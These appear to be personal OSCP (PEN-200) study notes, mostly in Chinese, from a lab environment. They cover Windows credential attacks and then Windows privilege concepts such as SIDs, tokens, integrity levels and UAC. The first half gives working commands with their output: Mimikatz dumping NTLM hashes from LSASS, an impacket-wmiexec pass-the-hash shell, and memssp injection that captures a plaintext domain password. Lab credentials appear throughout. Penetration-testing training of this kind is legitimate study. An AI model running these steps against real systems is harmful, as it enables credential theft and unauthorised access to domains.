---
title: '[OSCP, PEN-200] Instructional notes - Part 3'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 3
===

# [Link back to: "OSCP: Self Note - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "OSCP: Self Note - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 2](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md) 內容


# Password Attacks
## Working with Password Hashes
### ... [(Instructional notes - Part 2)](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#working-with-password-hashes)
### Windows Credential Guard
以上皆處理了屬於本機帳戶的雜湊值，若遇到其他類型的帳號 (ex. [Windows domain](https://en.wikipedia.org/wiki/Windows_domain) accounts)，取得 hash 便能進行爆破或是 pass-the-hash attack

>[!Important]
>domain hashes 相較於 local account hashes 不同:
>- local account hashes 儲存在 SAM 中
>- domain hashes 儲存在 memory 的 lsass.exe process

Mimikatz 可以識別這些儲存的憑證
前提： 以 Administrator 身份（or higher）運行並 啟用SeDebugPrivilege 存取權限

#### 1. 登入 RDP 留下 domain user's information
- SERVERWK248: 192.168.145.248
    > Administrator / QWERTY123!@#
- CLIENTWK246: 192.168.145.246
    > offsec / lab
- CLIENTWK245: 192.168.145.245
    > offsec / lab

以下範例以 CORP\Administrator 使用者身分 (pwd: QWERTY!@#2/）) 登入 RDP 進入 CLIENTWK246:
```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.246 /dynamic-resolution
[00:19:01:640] [769709:769710] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
```
> 當成功連線時， LSASS 已在 memory 中快取了網域用戶的資訊
>> 接著「登出」
>> 使用 本機管理員 offsec 的身分重新登入

```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"offsec" /p:"lab" /v:192.168.145.246 /dynamic-resolution
```
![image](https://hackmd.io/_uploads/SkGXbLe91g.png)

#### 2. 登入 local administrator 執行 Mimikatz
```
PS C:\> cd .\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2452263 (00000000:00256b27)
Session           : RemoteInteractive from 3
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
Logon Time        : 2/16/2025 10:42:00 PM
SID               : S-1-5-21-180219712-1214652076-1814130762-1002
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : CLIENTWK246
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : a188967ac5edb88eca3301f93f756ca8
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : offsec
         * Domain   : CLIENTWK246
         * Password : (null)
        ssp :
        credman :
        cloudap :

...

Authentication Id : 0 ; 1173179 (00000000:0011e6bb)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 2/16/2025 10:40:09 PM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
         * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : Administrator
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

...
mimikatz #
```
> `sekurlsa::logonpasswords`: dump all available credentials\
> domain user 不會存在 SAM, 因此不會使用 `lsadump::sam`\
> (可參見: [#Cracking NTLM 2.3](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#23-%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A2%BC%E5%92%8C%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A))


以上透過 Mimikatz 取得本機 offsec 使用者的憑證資訊，也從 CORP.COM domain 中獲得管理員使用者的資訊：
```
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
...
* NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e

User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
...
* NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
```

#### 3. 將取得的 credentials 利用 pass-the-hash attack
可以利用以上 Administrator 資訊， 透過 pass-the-hash attack 存取 SERVERWK248 (192.168.145.248) 
```
┌──(chw㉿CHW)-[~]
└─$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.145.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.145.248 and isFQDN is False
[+] StringBinding: SERVERWK248[57267]
[+] StringBinding: 192.168.145.248[57267]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.145.248[57267]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
corp\administrator
```

>[!Warning]
>微軟為了強化安全性，引入 
>1. [VBS](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)（Virtualization-Based Security):\
>VBS 是微軟利用 CPU virtualization, 建立和隔離記憶體的安全區域: [Virtual Secure Mode](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM)
>VBS runs a [hypervisor](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system.
> 2. VSM 透過 [Virtual Trust Levels](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf)(VTLs) 來維持這種隔離，目前 Microsoft 支援最多 16 個級別
> 
> 3. VBS 內部的 Virtual Trust Levels（VTL，虛擬信任層）
>- **VTL0 (VSM Normal Mode)**: 執行普通的 Windows 環境（一般應用程式、使用者模式與核心模式）。
>- **VTL1 (VSM Secure Mode)**: Windows 安全機制，存放 LSASS（本機安全驗證系統） 的關鍵資料，例如密碼雜湊與憑證。
>
>user-mode in VTL1: [Isolated User-Mode (IUM)](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes)處理 Trusted Processes, Secure Processes 或 Trustlets

以上 features 皆是在 Windows 10 和 Windows Server 2016 首次推出，預設皆為 Disable。所以在大多企業都沒有啟用。

>[!Important]
>Credential Guard 的影響:\
>一般情況下，Mimikatz 可以從 `lsass.exe` 記憶體中截取明文密碼或 NTLM 雜湊。\
>Credential Guard 啟用時，敏感資料都存放在 VTL1 的 LSAISO.exe，即使拿到 SYSTEM 權限，也無法存取這些資訊。(Mimikatz 只能讀取 LSASS process)

#### 確認是否運行 Credential Guard
```
PS C:\Users\offsec> Get-ComputerInfo

WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
...
HyperVisorPresent                                       : True
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
```
> DeviceGuardSecurityServicesRunning下啟用的措施之一是`CredentialGuard`。

#### Credential Guard 啟用下使用 Mimikatz
```
PS C:\Users\offsec> cd C:\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
```

> 在同樣成功登入 domain CORP.COM 的情況下，無法取得 cached hashes

#### 如何繞過 Credential Guard
Windows 提供了多種身份[驗證機制](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))，例如：\
- LSA（Local Security Authority，當地安全機構）
- Winlogon（Windows 登入程序）
- SSPI（Security Support Provider Interface，安全支援提供者介面）

其中 SSPI 是 Windows 認證的基礎機制，所有需要身份驗證的應用程式和服務都會透過 SSPI 進行身份驗證。Windows 預設提供多種 Security Support Providers（SSP，安全支援提供者），如：
- Kerberos SSP（負責 Kerberos 驗證）
- NTLM SSP（負責 NTLM 驗證）
這些 SSP 都是以 DLL 檔案存在，每當進行身份驗證時，SSPI 會決定要使用哪一個 SSP 來處理請求。

#### 攻擊手法
Windows 允許透過 AddSecurityPackage API 或 修改登錄檔 來新增自訂的 SSP：

登錄路徑：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages`\
每次系統開機時，LSASS 皆會讀取這個登錄鍵中的所有 SSP，並將對應的 DLL 載入到記憶體中。\
**這代表如果我們開發一個惡意 SSP 並將其註冊到 LSASS，就可以讓 Windows 透過我們的 SSP 來處理身份驗證，從而攔截並取得使用者的明文密碼。**

>[!Important]
>Mimikatz 已經內建這種攻擊方式，透過 `memssp` 來實作。
memssp 的特點：\
- 不會在磁碟上留下 DLL 檔案，直接注入記憶體（避免被防毒軟體偵測）。
- 攔截所有經過 SSPI 的身份驗證請求，並記錄明文密碼到 `C:\Windows\System32\mimilsa.log`。

Mimikatz 注入惡意 SSP
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```
在惡意 SSP 注入後，
1. 等待另一個使用者遠端連接到機器
2. 社交工程

(透過手動登入)
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.245 /dynamic-resolution
```
透過 RDP 成功驗證機器身分後，登出。\
再以本機管理員(offsec) 登入 CLIENTWK245 ，調查惡意 SSP 的結果。
驗證 Mimikatz 注入 SSP 到 LSASS時，憑證將會保存在日誌檔案    `C:\Windows\System32\mimilsa.log`。
```
PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?
```
> CORP\Administrator  QWERTY123!@#

# Windows Privilege Escalation

## Enumerating Windows
First need to get familiar with the Windows privilege structure and access control mechanisms.
### Understanding Windows Privileges and Access Control Mechanisms
#### 1. [Security Identifier](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) (SID) 
Windows uses a SID to identify entities. SID 是獨立的 value，會分配給每個 entity 或 principa，讓 Windows 識別 users 和 groups。
-  [Local Security Authority](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)(LSA): 產生 local accounts and groups
- Domain Controller (DC): 產生 domain users and domain groups
>[!Tip]
> Windows uses only the SID, not usernames, to identify principals for access control management.

SID 格式：`S`、`R`、`X` 和 `Y` 表示
```
S-R-X-Y
```
> `S`：固定，表示是一個 SID。\
`R`（Revision）：SID 版本，目前固定為 1。\
`X`（Identifier Authority）：表示識別碼的發行機構，5（NT Authority）：最常見，表示本機或網域中的使用者和群組。\
`Y`（Sub Authorities）：細分權限的識別碼，包含：
>- 網域識別碼（Domain Identifier）：對於本機使用者，這是該機器的識別碼；對於網域使用者，則是網域的識別碼。
>- 相對識別碼（RID, Relative Identifier）：用來區分個別使用者或群組。

```
PS C:\> whoami /user

USER INFORMATION
----------------

User Name        SID
================ ==============================================
chw-macbook\cwei S-1-5-21-1336799502-1441772794-948155058-1001
```
> `S-1-5`：表示 NT Authority。\
`21-1336799502-1441772794-948155058`：這部分是網域或本機識別碼。\
`1001`（RID）：表示這是該系統上的第二個本機使用者（第一個通常是 1000）。


[well-known SIDs](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) ( RID under 1000 ):
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

#### 2. [access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
>[!Tip]
>The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token.

- Primary Token：
由 登入的使用者 擁有，會附加到該使用者啟動的任何 Process 或 Thread，目的是為了定義每個 object 之間的 permissions。
例如: 當使用者開啟 cmd.exe，該命令提示字元的 process 會擁有該使用者的 Primary Token。
- Impersonation Token：
允許 Thread 使用不同於其 process 的權限來存取物件。
例如: 當某個程式需要以 不同使用者的身分 執行時，可能會使用 Impersonation Token。

#### 3. [Mandatory Integrity Control](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)

除了 SID 和 Token 之外，Windows 透過 [Integrity Level](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) 來進一步限制存取權限，這個機制可以防止 **低權限的應用程式影響高權限的應用程式**。

From Windows Vista onward, processes run on five integrity levels:
```
- System integrity – Kernel-mode processes with SYSTEM privileges
- High integrity – Processes with administrative privileges
- Medium integrity – Processes running with standard user privileges
- Low integrity level – Restricted processes, often used for security   [sandboxing](https://en.wikipedia.org/wiki/Sandbox_(software_development)), such as web browsers.
- Untrusted – The lowest integrity level, assigned to highly restricted processes that pose potential security risks
```
[Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) 可以檢查 process integrity levels

![image](https://hackmd.io/_uploads/SJwrBog9kx.png)
> 圖中皆執行 Powershell，可以推斷出 High integrity level process 是由 administrative user 啟動的，而 Medium integrity level process  是由 regular user 啟動的

#### 4. [User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
為了保護 operating system，即使使用者是 Administrator，執行時仍會預設以標準使用者權限運行，降低系統被攻擊的風險。 

當管理員帳戶登入 Windows 時，系統會分配 兩個 Access Tokens：
- Filtered Admin Token (standard user token)：
預設使用的 Token ，所有應用程式和操作都以標準使用者權限運行，不能直接修改系統關鍵檔案或 Registry。
- Administrator Token：
只有在需要提升權限時才會使用，例如修改系統設定或安裝軟體。
(會跳出 [UAC consent prompt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 視窗，需手動確認)

From Windows Vista onward, processes run on four integrity levels:
```
System integrity – Kernel-mode processes with SYSTEM privileges
High integrity – Administrative processes
Medium integrity – Standard user processes
Low integrity – Restricted processes, commonly used for sandboxing (e.g., web browsers)
```

